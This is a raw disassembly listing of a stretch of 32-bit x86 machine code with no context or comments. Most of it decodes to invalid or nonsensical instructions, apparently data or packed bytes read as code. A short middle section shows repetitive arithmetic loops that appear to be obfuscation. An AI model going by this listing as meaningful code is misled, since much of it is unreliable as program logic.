  41182b:	push   0x28483b29
  411830:	jmp    0x824f9803
  411835:	mov    ss,WORD PTR [edx+edi*8-0x5a30ff6a]
  41183c:	pop    esp
  41183d:	cwde   
  41183e:	pop    es
  41183f:	(bad)  
  411840:	daa    
  411841:	leave  
  411842:	ret    0xb81
  411845:	rcl    BYTE PTR fs:[esi],1
  411848:	mov    WORD PTR [ebp-0x6e],cs
  41184b:	sahf   
  41184c:	cmp    BYTE PTR [ebx-0x76c4cb32],dh
  411852:	mov    ebx,0x5e4d1c0e
  411857:	jnp    0x411864
  411859:	adc    eax,0x3bcc0b9e
  41185e:	sub    al,0xe4
  411860:	push   eax
  411861:	dec    edi
  411862:	pop    esi
  411863:	mov    cl,0xd2
  411865:	cwde   
  411866:	iret   
  411867:	jg     0x411860
  411869:	(bad)  
  41186a:	ficomp DWORD PTR [eax+edx*1]
  41186d:	loopne 0x411851
  41186f:	popf   
  411870:	cdq    
  411871:	out    0xbf,al
  411873:	jnp    0x41186b
  411875:	retf   
  411876:	ins    BYTE PTR es:[edi],dx
  411877:	pusha  
  411878:	test   eax,0xb12a5964
  41187d:	push   ecx
  41187e:	jmp    0x59e7:0xe84bdef9
  411885:	push   ds
  411886:	into   
  411887:	pop    eax
  411888:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41188a:	xor    bl,BYTE PTR [ebp-0x38]
  41188d:	sti    
  41188e:	daa    
  41188f:	call   0xec8d:0xb3660c0a
  411896:	jnp    0x41183d
  411898:	in     al,0x6d
  41189a:	xor    al,BYTE PTR [edi]
  41189c:	das    
  41189d:	jno    0x4118bf
  41189f:	hlt    
  4118a0:	shr    DWORD PTR [eax],cl
  4118a2:	cld    
  4118a3:	je     0x411842
  4118a5:	pop    esp
  4118a6:	mov    edx,esp
  4118a8:	mov    cl,0x74
  4118aa:	and    ch,BYTE PTR [ebp-0x70c85ffb]
  4118b0:	add    eax,DWORD PTR [edi-0x5e]
  4118b3:	push   esi
  4118b4:	call   0x5e6c:0xd17164d5
  4118bb:	add    edx,DWORD PTR [ebx+0x33ac245e]
  4118c1:	push   ebx
  4118c2:	pop    eax
  4118c3:	outs   dx,BYTE PTR ds:[esi]
  4118c4:	in     eax,0x8
  4118c6:	jbe    0x4118e4
  4118c8:	stos   BYTE PTR es:[edi],al
  4118c9:	or     ch,BYTE PTR [ebx+0x285957a9]
  4118cf:	scas   al,BYTE PTR es:[edi]
  4118d0:	shl    DWORD PTR [edi+eiz*8],cl
  4118d3:	sub    ebp,esp
  4118d5:	cmp    cl,cl
  4118d7:	cmp    DWORD PTR [ecx-0x10f89b7a],esi
  4118dd:	scas   al,BYTE PTR es:[edi]
  4118de:	add    cl,cl
  4118e0:	or     cl,BYTE PTR [edi+0x1cd05ded]
  4118e6:	dec    ebp
  4118e7:	cld    
  4118e8:	adc    BYTE PTR [ebx+0x11],ah
  4118eb:	int3   
  4118ec:	loop   0x41193b
  4118ee:	cmc    
  4118ef:	out    0x4e,eax
  4118f1:	mov    ecx,0xa41522c2
  4118f6:	retf   
  4118f7:	sub    bh,BYTE PTR [edx]
  4118f9:	outs   dx,DWORD PTR ds:[esi]
  4118fa:	mov    al,ds:0xd51b694e
  4118ff:	cs (bad) 
  411901:	cmp    BYTE PTR [ebx],ah
  411903:	retf   0x9490
  411906:	pop    eax
  411907:	inc    esp
  411908:	mov    DWORD PTR [eax+eax*2-0x46bcf43a],ebp
  41190f:	sar    ch,cl
  411911:	outs   dx,DWORD PTR ds:[esi]
  411912:	cdq    
  411913:	outs   dx,DWORD PTR ds:[esi]
  411914:	or     eax,0xffcae3f9
  411919:	dec    edx
  41191a:	(bad)  
  41191b:	aam    0x9d
  41191d:	inc    esp
  41191e:	jl     0x4118c4
  411920:	rcr    DWORD PTR [edx-0x26a4e44],cl
  411926:	jbe    0x411973
  411928:	and    bh,BYTE PTR [ebp+0x62]
  41192b:	adc    esp,DWORD PTR [ebp-0x14a4d32f]
  411931:	out    dx,eax
  411932:	pop    ds
  411933:	je     0x411923
  411935:	inc    ebx
  411936:	jo     0x4118f2
  411938:	sub    bl,BYTE PTR [esi+0x74]
  41193b:	(bad)  
  41193c:	cmc    
  41193d:	dec    ebx
  41193e:	mov    esi,0xd11b1a3e
  411943:	sub    dh,ch
  411945:	(bad)  
  411946:	xor    ebp,DWORD PTR [esi]
  411948:	retf   
  411949:	cmp    DWORD PTR [ecx-0x78],esi
  41194c:	and    ecx,ebp
  41194e:	add    dh,BYTE PTR [eax+0x7d0702cb]
  411954:	and    eax,0x2d6f06ba
  411959:	sub    al,BYTE PTR [esi-0x2d]
  41195c:	xor    esi,DWORD PTR [edx+0x77]
  41195f:	jg     0x4119b9
  411961:	jge    0x411903
  411963:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411964:	push   esi
  411965:	jmp    0x411979
  411967:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411968:	inc    ecx
  411969:	jo     0x4119ab
  41196b:	shl    DWORD PTR [edx],1
  41196d:	dec    esi
  41196e:	or     esi,DWORD PTR [esi+ebp*1]
  411971:	pop    eax
  411972:	cli    
  411973:	xor    eax,0x8a6e2eeb
  411978:	and    dl,BYTE PTR [ecx+0x4a]
  41197b:	push   ecx
  41197c:	jnp    0x411939
  41197e:	xchg   ebp,eax
  41197f:	xor    DWORD PTR [eax],edx
  411981:	xchg   edx,eax
  411982:	xor    DWORD PTR [ebx+0x58ad3324],ecx
  411988:	retf   
  411989:	leave  
  41198a:	test   eax,0xab1eb903
  41198f:	or     ebp,esi
  411991:	pop    ecx
  411992:	cli    
  411993:	dec    edx
  411994:	add    DWORD PTR [edx+0x56],0x12
  411998:	(bad)  
  411999:	cmp    DWORD PTR [ebp+0x16],0xffffff8c
  41199d:	or     DWORD PTR [edi],ebx
  41199f:	push   0x6a6101b9
  4119a4:	push   esi
  4119a5:	sub    eax,0x68217193
  4119aa:	loope  0x41199d
  4119ac:	imul   ecx,ebx,0xd95e27eb
  4119b2:	ss leave 
  4119b4:	or     al,0x17
  4119b6:	ins    DWORD PTR es:[edi],dx
  4119b7:	call   0xc05d:0xe2420ac8
  4119be:	je     0x4119e8
  4119c0:	loope  0x4119e1
  4119c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119c3:	push   ss
  4119c4:	and    dh,BYTE PTR [ecx]
  4119c6:	mov    dl,0x90
  4119c8:	mov    ?,WORD PTR [eax+0x6d]
  4119cb:	std    
  4119cc:	jp     0x411955
  4119ce:	loope  0x4119e5
  4119d0:	fdiv   QWORD PTR [esi+0x6abe6fdd]
  4119d6:	scas   al,BYTE PTR es:[edi]
  4119d7:	mov    ch,0x4
  4119d9:	mov    eax,0xee3f4108
  4119de:	pushf  
  4119df:	push   ss
  4119e0:	and    eax,0x3ea0b28a
  4119e5:	loopne 0x411a25
  4119e7:	adc    bl,BYTE PTR [ebx+0x1]
  4119ea:	pop    ebx
  4119eb:	adc    al,0xf0
  4119ed:	les    esi,FWORD PTR [ecx+0x3d2b812d]
  4119f3:	mov    WORD PTR [ebx+0x67],gs
  4119f6:	scas   eax,DWORD PTR es:[edi]
  4119f7:	mov    ebx,0xb646c1d1
  4119fc:	out    0xee,al
  4119fe:	daa    
  4119ff:	add    al,0x8f
  411a01:	mov    esi,0xc4bac4a1
  411a06:	xor    cl,bl
  411a08:	call   0x3219:0x1a13d8e2
  411a0f:	mov    edx,0xea009230
  411a14:	and    BYTE PTR [edi+eiz*8-0x26932223],dh
  411a1b:	imul   ebx,esp,0x2282b94
  411a21:	(bad)  
  411a22:	jno    0x411a44
  411a24:	fisttp WORD PTR [ebx+0x35b64074]
  411a2a:	jbe    0x411a68
  411a2c:	add    al,0x64
  411a2e:	mov    ds:0xa2f8e192,eax
  411a33:	cs push 0x3cd3d43
  411a39:	inc    esi
  411a3a:	mov    WORD PTR [edx],es
  411a3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a3d:	mov    ah,0x30
  411a3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a40:	sti    
  411a41:	mov    eax,0x84526614
  411a46:	xor    al,0x42
  411a48:	sbb    bl,dl
  411a4a:	int3   
  411a4b:	adc    ecx,DWORD PTR [ecx]
  411a4d:	or     BYTE PTR [eax],0x8a
  411a50:	out    0x39,eax
  411a52:	nop
  411a53:	ret    0x556e
  411a56:	mov    ds:0x3773350d,eax
  411a5b:	dec    DWORD PTR [edx-0x732b3831]
  411a61:	addr16 call 0x9de0:0x56acdec7
  411a69:	jmp    0x1032cb86
  411a6e:	add    BYTE PTR [edi-0x6a],ch
  411a71:	repz sbb esp,ecx
  411a74:	mov    ah,0x78
  411a76:	push   DWORD PTR [eax]
  411a78:	sahf   
  411a79:	push   cs
  411a7a:	retf   
  411a7b:	dec    edx
  411a7c:	or     eax,0xc0c989
  411a81:	mov    eax,ds:0x13953468
  411a86:	dec    esp
  411a87:	(bad)  
  411a88:	sbb    esi,esi
  411a8a:	outs   dx,BYTE PTR ds:[esi]
  411a8b:	bound  esi,QWORD PTR [ebp+0x1a]
  411a8e:	ret    0xe0dd
  411a91:	add    al,0x79
  411a93:	jle    0x411a81
  411a95:	call   0x98ea:0xa8a44442
  411a9c:	mov    esp,0x1f11f38a
  411aa1:	test   BYTE PTR [esi+0x10f9eab0],al
  411aa7:	pop    ebx
  411aa8:	neg    BYTE PTR [ebx+ecx*4+0x55]
  411aac:	call   0xd644eae4
  411ab1:	cmp    ecx,edx
  411ab3:	mov    ecx,DWORD PTR [ebp-0x14]
  411ab6:	mov    DWORD PTR [ebp+0x8],ecx
  411ab9:	mov    ecx,DWORD PTR [ebp+0x8]
  411abc:	je     0x4164f7
  411ac2:	xor    ecx,eax
  411ac4:	add    ecx,esi
  411ac6:	mov    ecx,0x242ebe9
  411acb:	je     0x411bdb
  411ad1:	mov    edx,DWORD PTR [ebp+0x8]
  411ad4:	mov    ebx,DWORD PTR [ebp-0x8]
  411ad7:	xor    edx,eax
  411ad9:	xor    ebx,eax
  411adb:	sub    edx,ebx
  411add:	sub    edx,esi
  411adf:	xor    edx,eax
  411ae1:	mov    DWORD PTR [ebp+0x8],edx
  411ae4:	mov    edx,DWORD PTR [ebp+0x8]
  411ae7:	mov    ebx,DWORD PTR [ebp-0x58]
  411aea:	add    edx,0x5708c4
  411af0:	imul   edx,ebx
  411af3:	mov    DWORD PTR [ebp-0x58],edx
  411af6:	mov    edx,DWORD PTR [ebp+0x8]
  411af9:	mov    ebx,DWORD PTR [ebp-0x54]
  411afc:	add    edx,0x64f8da
  411b02:	or     edx,ebx
  411b04:	mov    DWORD PTR [ebp-0x54],edx
  411b07:	mov    edx,DWORD PTR [ebp+0x8]
  411b0a:	mov    ebx,DWORD PTR [ebp-0x50]
  411b0d:	add    edx,ecx
  411b0f:	xor    edx,ebx
  411b11:	mov    DWORD PTR [ebp-0x50],edx
  411b14:	mov    edx,DWORD PTR [ebp+0x8]
  411b17:	mov    ebx,DWORD PTR [ebp-0x4c]
  411b1a:	add    edx,edi
  411b1c:	and    edx,ebx
  411b1e:	mov    DWORD PTR [ebp-0x4c],edx
  411b21:	mov    edx,DWORD PTR [ebp+0x8]
  411b24:	mov    ebx,DWORD PTR [ebp-0x48]
  411b27:	lea    edx,[ebx+edx*1+0x241fc1f]
  411b2e:	mov    DWORD PTR [ebp-0x48],edx
  411b31:	mov    edx,DWORD PTR [ebp+0x8]
  411b34:	mov    ebx,0xfa5e15e2
  411b39:	sub    ebx,edx
  411b3b:	add    ebx,DWORD PTR [ebp-0x44]
  411b3e:	mov    DWORD PTR [ebp-0x44],ebx
  411b41:	mov    edx,DWORD PTR [ebp+0x8]
  411b44:	xor    edx,eax
  411b46:	add    edx,esi
  411b48:	jne    0x411ad1
  411b4e:	jmp    0x411bdb
  411b53:	mov    edx,DWORD PTR [ebp-0x14]
  411b56:	mov    DWORD PTR [ebp+0x8],edx
  411b59:	jmp    0x411bce
  411b5e:	mov    edx,DWORD PTR [ebp+0x8]
  411b61:	mov    ebx,DWORD PTR [ebp-0x8]
  411b64:	xor    edx,eax
  411b66:	xor    ebx,eax
  411b68:	sub    edx,ebx
  411b6a:	sub    edx,esi
  411b6c:	xor    edx,eax
  411b6e:	mov    DWORD PTR [ebp+0x8],edx
  411b71:	mov    edx,DWORD PTR [ebp+0x8]
  411b74:	mov    ebx,DWORD PTR [ebp-0x58]
  411b77:	add    edx,0x5708c4
  411b7d:	imul   edx,ebx
  411b80:	mov    DWORD PTR [ebp-0x58],edx
  411b83:	mov    edx,DWORD PTR [ebp+0x8]
  411b86:	mov    ebx,DWORD PTR [ebp-0x54]
  411b89:	add    edx,0x64f8da
  411b8f:	or     edx,ebx
  411b91:	mov    DWORD PTR [ebp-0x54],edx
  411b94:	mov    edx,DWORD PTR [ebp+0x8]
  411b97:	mov    ebx,DWORD PTR [ebp-0x50]
  411b9a:	add    edx,ecx
  411b9c:	xor    edx,ebx
  411b9e:	mov    DWORD PTR [ebp-0x50],edx
  411ba1:	mov    edx,DWORD PTR [ebp+0x8]
  411ba4:	mov    ebx,DWORD PTR [ebp-0x4c]
  411ba7:	add    edx,edi
  411ba9:	and    edx,ebx
  411bab:	mov    DWORD PTR [ebp-0x4c],edx
  411bae:	mov    edx,DWORD PTR [ebp+0x8]
  411bb1:	mov    ebx,DWORD PTR [ebp-0x48]
  411bb4:	lea    edx,[ebx+edx*1+0x241fc1f]
  411bbb:	mov    DWORD PTR [ebp-0x48],edx
  411bbe:	mov    edx,DWORD PTR [ebp+0x8]
  411bc1:	mov    ebx,0xfa5e15e2
  411bc6:	sub    ebx,edx
  411bc8:	add    ebx,DWORD PTR [ebp-0x44]
  411bcb:	mov    DWORD PTR [ebp-0x44],ebx
  411bce:	mov    edx,DWORD PTR [ebp+0x8]
  411bd1:	xor    edx,eax
  411bd3:	add    edx,esi
  411bd5:	jne    0x411b5e
  411bdb:	mov    edx,DWORD PTR [ebp-0x14]
  411bde:	mov    DWORD PTR [ebp+0x8],edx
  411be1:	jmp    0x4163be
  411be6:	jmp    0x413f9a
  411beb:	rcr    BYTE PTR [ecx-0x6f],1
  411bee:	and    BYTE PTR [ecx+0x70],dh
  411bf1:	ror    DWORD PTR [ecx+0x1e6f5998],1
  411bf7:	sub    eax,0x4b330080
  411bfc:	test   eax,0x5feb7c7c
  411c01:	jl     0x411c7f
  411c03:	mov    eax,ds:0xb8581092
  411c08:	cmp    al,0xd9
  411c0a:	or     BYTE PTR [ecx+0x7243d20d],al
  411c10:	xchg   edi,eax
  411c11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c12:	sahf   
  411c13:	mov    eax,0x6211bfaf
  411c18:	and    ch,BYTE PTR [ecx-0x78]
  411c1b:	mov    ecx,0x25e23b1f
  411c20:	shl    edi,1
  411c22:	ds jge 0x411c6b
  411c25:	nop
  411c26:	fistp  DWORD PTR ss:[ebx-0x1a20cce0]
  411c2d:	je     0x411c12
  411c2f:	dec    esp
  411c30:	mul    DWORD PTR [eax+0x31fa5178]
  411c36:	mov    dh,0xa7
  411c38:	retf   
  411c39:	push   ebp
  411c3a:	push   0x94796074
  411c3f:	xchg   edi,eax
  411c40:	cmc    
  411c41:	jle    0x411c44
  411c43:	je     0x411c7b
  411c45:	xchg   esi,eax
  411c46:	add    BYTE PTR [ebp-0x30c62685],0xf7
  411c4d:	jge    0x411c4c
  411c4f:	stos   BYTE PTR es:[edi],al
  411c50:	imul   eax,DWORD PTR [esi+0x37],0x2d13e44b
  411c57:	shl    DWORD PTR [ebp+0x56],cl
  411c5a:	sar    ebp,0xfc
  411c5d:	adc    cl,0x31
  411c60:	add    al,0x26
  411c62:	xchg   edx,eax
  411c63:	dec    edi
  411c64:	in     eax,0x10
  411c66:	int    0x9f
  411c68:	les    ebx,FWORD PTR [esi+ebx*4+0x3e8d006f]
  411c6f:	(bad)  
  411c70:	inc    edi
  411c71:	or     eax,0x7e5a8c15
  411c76:	fbstp  TBYTE PTR [edi+0x14]
  411c79:	cwde   
  411c7a:	fld    st(5)
  411c7c:	pop    ecx
  411c7d:	pusha  
  411c7e:	ret    
  411c7f:	stos   BYTE PTR es:[edi],al
  411c80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c81:	test   DWORD PTR [eax+0x5ba7f3b5],ebp
  411c87:	imul   eax,DWORD PTR [ebx-0x18],0xfffffff2
  411c8b:	inc    ecx
  411c8c:	aaa    
  411c8d:	shl    BYTE PTR [ebp+0x20f023bf],1
  411c93:	mov    WORD PTR [ebx],?
  411c95:	push   es
  411c96:	outs   dx,BYTE PTR ds:[esi]
  411c97:	out    0x1d,eax
  411c99:	sub    al,ah
  411c9b:	ds push edi
  411c9d:	mov    DWORD PTR [esp+ebx*4-0x3],esp
  411ca1:	inc    esi
  411ca2:	pop    eax
  411ca3:	jge    0x411c8a
  411ca5:	mov    cl,0x63
  411ca7:	jae    0x411cf2
  411ca9:	ins    BYTE PTR es:[edi],dx
  411caa:	or     al,0x26
  411cac:	add    al,0xb7
  411cae:	cmp    ch,BYTE PTR [ecx+ebx*1+0x49af0a3b]
  411cb5:	sti    
  411cb6:	add    ah,BYTE PTR [ebx]
  411cb8:	sbb    al,0x1c
  411cba:	iret   
  411cbb:	jb     0x411cec
  411cbd:	push   0x1f09413b
  411cc2:	sub    ecx,eax
  411cc4:	add    al,0x4c
  411cc6:	out    dx,eax
  411cc7:	xor    ah,BYTE PTR [esi]
  411cc9:	inc    ebx
  411cca:	lock loope 0x411c8d
  411ccd:	int3   
  411cce:	(bad)  
  411ccf:	fwait
  411cd0:	xchg   esi,eax
  411cd1:	sub    eax,0xe5122386
  411cd6:	aaa    
  411cd7:	retf   0x7fa8
  411cda:	pop    ss
  411cdb:	arpl   WORD PTR [edx+0x49efc0de],sp
  411ce1:	inc    esi
  411ce2:	sub    edx,DWORD PTR [ebx]
  411ce4:	sbb    ch,BYTE PTR [ebp+eiz*2-0x3364d5fe]
  411ceb:	jmp    0x411d2a
  411ced:	mov    ebx,0xb93ff02c
  411cf2:	dec    edi
  411cf3:	mov    ?,WORD PTR [esi+0x7edebd85]
  411cf9:	jno    0x411c9e
  411cfb:	fdivr  QWORD PTR [edx-0x7263235a]
  411d01:	xor    BYTE PTR [ecx-0x6c62fb28],dh
  411d07:	mov    ss,WORD PTR [eax-0x65]
  411d0a:	pusha  
  411d0b:	pop    es
  411d0c:	test   eax,0x3e96eb0e
  411d11:	sbb    ebx,DWORD PTR [edx+0x67eef892]
  411d17:	inc    esp
  411d18:	sbb    eax,0xfbe695c3
  411d1d:	jle    0x411d9e
  411d1f:	push   cs
  411d20:	mov    esp,0xa40d3a79
  411d25:	cmp    bl,BYTE PTR [edx+0x4e]
  411d28:	xchg   edi,esi
  411d2a:	inc    edi
  411d2b:	(bad)  
  411d2d:	int3   
  411d2e:	mov    BYTE PTR [ecx-0x50dce823],cl
  411d34:	adc    edx,ebx
  411d36:	call   DWORD PTR [esi-0x7e612221]
  411d3c:	dec    ebp
  411d3d:	rcr    bh,cl
  411d3f:	outs   dx,DWORD PTR ds:[esi]
  411d40:	or     ch,BYTE PTR [eax+0x3c]
  411d43:	sbb    ecx,eax
  411d45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d46:	sbb    edx,0x52
  411d49:	js     0x411cfd
  411d4b:	mov    ds:0x39ff83fe,eax
  411d50:	cmp    ah,al
  411d52:	hlt    
  411d53:	jmp    0x8b6092d6
  411d58:	push   0x1d613ac7
  411d5d:	test   DWORD PTR [eax],ecx
  411d5f:	psrlw  mm3,QWORD PTR [eax+ebx*2+0x26]
  411d64:	ja     0x411d3f
  411d66:	fidivr WORD PTR [esi+0x2b]
  411d69:	mov    cl,0xcd
  411d6c:	adc    ecx,ebp
  411d6e:	jnp    0x411dc9
  411d70:	out    dx,eax
  411d71:	push   eax
  411d72:	mov    esp,0xb365f44f
  411d77:	jbe    0x411ddb
  411d79:	(bad)  
  411d7a:	jbe    0x411d5c
  411d7c:	cmp    eax,0x5d977f3f
  411d81:	lea    ebx,[edx+0x42d59090]
  411d87:	mov    BYTE PTR [eax],cl
  411d89:	jmp    0x411d8a
  411d8b:	pop    ss
  411d8c:	out    0xb3,al
  411d8e:	and    edx,DWORD PTR [edx-0xda6c315]
  411d94:	jbe    0x411d25
  411d96:	leave  
  411d97:	daa    
  411d98:	call   0x9a0c:0x80140f94
  411d9f:	push   edx
  411da0:	sub    cl,ah
  411da2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411da3:	xchg   esp,eax
  411da4:	cwde   
  411da5:	data16 fs jp 0x411e12
  411da9:	mov    ds:0xaa888d50,eax
  411dae:	xchg   edx,eax
  411daf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411db0:	mov    bh,BYTE PTR ds:[edi+0x677c0357]
  411db7:	sub    BYTE PTR [ebx],bh
  411db9:	mov    WORD PTR [edx-0x3354a017],cs
  411dbf:	inc    edx
  411dc0:	ins    BYTE PTR es:[edi],dx
  411dc1:	inc    ebp
  411dc2:	mov    ebx,DWORD PTR [edi+eiz*1-0x73]
  411dc6:	push   ecx
  411dc7:	sub    eax,0xdd1d0b86
  411dcc:	fild   QWORD PTR ds:0xe84de25e
  411dd2:	mov    ds:0xb63ebcc1,eax
  411dd7:	ja     0x411dc8
  411dd9:	push   cs
  411dda:	and    edi,DWORD PTR [ecx+ecx*2-0x1f]
  411dde:	pop    eax
  411ddf:	aas    
  411de0:	jecxz  0x411e0b
  411de2:	hlt    
  411de3:	and    DWORD PTR [esp+esi*1+0x77],ecx
  411de7:	mov    dh,BYTE PTR [eax-0xd]
  411dea:	xor    al,0x84
  411dec:	shl    edi,0x74
  411def:	sahf   
  411df0:	mov    cl,0xa6
  411df2:	dec    ebp
  411df3:	xchg   esp,eax
  411df4:	xchg   esi,eax
  411df5:	mov    ch,0xa6
  411df7:	push   es
  411df8:	fs mov eax,0xeec6a9d2
  411dfe:	in     al,0x39
  411e00:	inc    ebp
  411e01:	dec    ebx
  411e02:	shr    BYTE PTR [ebx+edx*8-0x79],0x94
  411e07:	mov    ah,0x1c
  411e09:	add    edx,DWORD PTR [esi-0x3b8b2997]
  411e0f:	sub    esp,eax
  411e11:	pop    ebp
  411e12:	test   DWORD PTR [edi-0x7a],ebp
  411e15:	test   eax,0x97a98ddf
  411e1a:	bnd jl 0x411df1
  411e1d:	xchg   BYTE PTR ds:0x801b80fc,al
  411e23:	(bad)  [edi]
  411e25:	mov    ebx,ebp
  411e27:	jae    0x411e64
  411e29:	icebp  
  411e2a:	retf   
  411e2b:	neg    BYTE PTR fs:[eax+ecx*4]
  411e2f:	adc    ah,BYTE PTR [edx]
  411e31:	mov    ds:0x509847d4,al
  411e36:	sub    BYTE PTR cs:[ebx],ch
  411e39:	xchg   edx,eax
  411e3a:	mov    es,WORD PTR [ebp+0x22c9125e]
  411e40:	clc    
  411e41:	xchg   esp,eax
  411e42:	mov    esp,0x823509ae
  411e47:	arpl   si,di
  411e49:	jo     0x411e61
  411e4b:	pop    ss
  411e4c:	neg    DWORD PTR [edi+0x5036d3f5]
  411e52:	mov    cs,WORD PTR [ecx+0x465e104c]
  411e58:	aaa    
  411e59:	jmp    0xb0113be
  411e5e:	pop    ecx
  411e5f:	xlat   BYTE PTR ds:[ebx]
  411e60:	call   0x613:0xe25f33e0
  411e67:	je     0x411e90
  411e69:	std    
  411e6a:	mov    eax,ds:0xe3b0f5e4
  411e6f:	cmp    ebx,DWORD PTR [esp+edi*4+0x519b75bf]
  411e76:	sbb    al,0xe0
  411e78:	icebp  
  411e79:	lds    eax,FWORD PTR [ecx+ebx*8-0x5c7e2d64]
  411e80:	cmp    eax,0x73e35baa
  411e85:	jl     0x411e4d
  411e87:	mov    eax,ds:0xc34b38bc
  411e8c:	xchg   ebp,eax
  411e8d:	inc    esi
  411e8e:	enter  0xd548,0xe9
  411e92:	fbld   TBYTE PTR [ebx]
  411e94:	xlat   BYTE PTR ds:[ebx]
  411e95:	xlat   BYTE PTR ds:[ebx]
  411e96:	push   edx
  411e97:	daa    
  411e98:	push   0x702960ee
  411e9d:	(bad)
  411ea0:	adc    al,0xa5
  411ea2:	cmp    DWORD PTR [eax-0x37],edx
  411ea5:	(bad)  
  411ea6:	neg    DWORD PTR [eax-0x67c9228]
  411eac:	shr    BYTE PTR [ebp-0x6d],0xed
  411eb0:	scas   al,BYTE PTR es:[edi]
  411eb1:	lock pop esp
  411eb3:	xchg   BYTE PTR [ebx],cl
  411eb5:	cli    
  411eb6:	(bad)  
  411eb7:	in     al,dx
  411eb8:	pushf  
  411eb9:	dec    edx
  411eba:	add    BYTE PTR [esi+0x480cc574],0x26
  411ec1:	adc    al,0x91
  411ec3:	js     0x411ee2
  411ec5:	in     eax,0xc9
  411ec7:	cmp    dl,dh
  411ec9:	scas   eax,DWORD PTR es:[edi]
  411eca:	inc    edi
  411ecb:	ds cmp eax,0x2f54e36e
  411ed1:	cmc    
  411ed2:	jecxz  0x411ead
  411ed4:	inc    edx
  411ed5:	jle    0x411ef6
  411ed7:	pop    edi
  411ed8:	mov    cl,0xee
  411eda:	xchg   ebx,eax
  411edb:	(bad)  
  411edc:	sub    DWORD PTR [ebx-0x16c77884],ebp
  411ee2:	nop
  411ee3:	and    eax,0x55253717
  411ee8:	into   
  411ee9:	inc    eax
  411eea:	or     al,0x89
  411eec:	mov    al,ds:0x7089ffa0
  411ef1:	mov    ecx,0x4bdbcdb
  411ef6:	push   0x406fd37b
  411efb:	mov    bl,0x8f
  411efd:	jmp    0xb9d7a14
  411f02:	loop   0x411ec9
  411f04:	or     edi,DWORD PTR [esi-0x32]
  411f07:	mov    dl,0x1a
  411f09:	adc    bh,ch
  411f0b:	loope  0x411f00
  411f0d:	jl     0x411f20
  411f0f:	cli    
  411f10:	lods   eax,DWORD PTR ds:[esi]
  411f11:	mov    ecx,DWORD PTR [esp+eiz*2]
  411f14:	arpl   WORD PTR [edi+edi*1+0x29],sp
  411f18:	mov    ebx,0xf61c4739
  411f1d:	jne    0x411efc
  411f1f:	imul   ecx,DWORD PTR [edx+0x2f4b761e],0x6152c7e
  411f29:	xchg   esi,eax
  411f2a:	sbb    DWORD PTR [esi+0x77],esp
  411f2d:	fnstcw WORD PTR cs:[eax]
  411f30:	repz and edi,edi
  411f33:	fs push cs
  411f35:	xor    eax,0xd113480
  411f3a:	add    al,0x5f
  411f3c:	push   esp
  411f3d:	cs ja  0x411eff
  411f40:	lods   eax,DWORD PTR ds:[esi]
  411f41:	fwait
  411f42:	cmp    eax,DWORD PTR [ecx]
  411f44:	dec    eax
  411f45:	data16 int 0x9e
  411f48:	lea    ebx,[ebx-0x49]
  411f4b:	or     DWORD PTR [edi+0x6c03fc85],0x6d553e2e
  411f55:	lods   al,BYTE PTR ds:[esi]
  411f56:	push   esi
  411f57:	cwde   
  411f58:	or     ecx,esi
  411f5a:	arpl   WORD PTR [esi],cx
  411f5c:	fs dec ebp
  411f5e:	dec    eax
  411f5f:	std    
  411f60:	dec    esi
  411f61:	mov    ds:0x5cc8214c,eax
  411f66:	push   ebp
  411f67:	add    DWORD PTR [edi+0x1c0ad12d],ebp
  411f6d:	or     DWORD PTR [ebx-0x18028644],esp
  411f73:	lods   eax,DWORD PTR ds:[esi]
  411f74:	and    BYTE PTR [edi-0x360649c9],cl
  411f7a:	rcl    BYTE PTR [eax-0x6049f2e0],1
  411f80:	cmp    esp,DWORD PTR [edi]
  411f82:	sbb    al,0x0
  411f84:	mov    esi,esp
  411f86:	out    dx,eax
  411f87:	xor    ebx,DWORD PTR [ebp-0x6c]
  411f8a:	je     0x411faf
  411f8c:	fs ins DWORD PTR es:[edi],dx
  411f8e:	cmp    DWORD PTR [edi-0x49],0xffffffb5
  411f92:	mov    bl,0x8f
  411f94:	popf   
  411f95:	push   ecx
  411f96:	sub    eax,0x7ef3826e
  411f9b:	cmp    cl,bl
  411f9d:	dec    ebx
  411f9e:	jmp    0x630b4a20
  411fa3:	xor    eax,DWORD PTR [edi-0x1d]
  411fa6:	aas    
  411fa7:	inc    ebx
  411fa8:	cld    
  411fa9:	clc    
  411faa:	jl     0x411fe3
  411fac:	pushf  
  411fad:	jmp    0xbe492289
  411fb2:	push   ss
  411fb3:	or     DWORD PTR [ebp-0x3b1885f2],eax
  411fb9:	mov    DWORD PTR cs:[edx-0x55],0x89d895ad
  411fc1:	cmc    
  411fc2:	pop    ebx
  411fc3:	mov    ds:0x88aef04f,eax
  411fc8:	and    esi,DWORD PTR [ebx]
  411fca:	out    0x2f,eax
  411fcc:	sub    DWORD PTR [edi+0x57],esi
  411fcf:	pop    ds
  411fd0:	dec    edi
  411fd1:	mov    DWORD PTR [eax-0x6b526daf],ebp
  411fd7:	adc    eax,0x1104380b
  411fdc:	nop
  411fdd:	inc    esp
  411fde:	xchg   BYTE PTR [ebx],bl
  411fe0:	leavew 
  411fe2:	sbb    DWORD PTR [edi+0x5c],ebx
  411fe5:	pushf  
  411fe6:	ret    0xf499
  411fe9:	add    al,0x7c
  411feb:	or     BYTE PTR [ebx+0x61],dl
  411fee:	sub    ebx,DWORD PTR [eax]
  411ff0:	scas   eax,DWORD PTR es:[edi]
  411ff1:	clc    
  411ff2:	pop    ebp
  411ff3:	xchg   BYTE PTR [edi+0x66135456],bl
  411ff9:	in     al,0x1d
  411ffb:	push   cs
  411ffc:	mov    dl,0x8
  411ffe:	adc    DWORD PTR [edx+0x3fe2b135],edx
  412004:	and    eax,0x338b5e3
  412009:	mov    eax,0x1fdd7a51
  41200e:	loopne 0x411fd3
  412010:	dec    edi
  412011:	addr16 jmp 0x412033
  412014:	push   esp
  412015:	mov    ebx,0x78a9cd1e
  41201a:	adc    al,0xe0
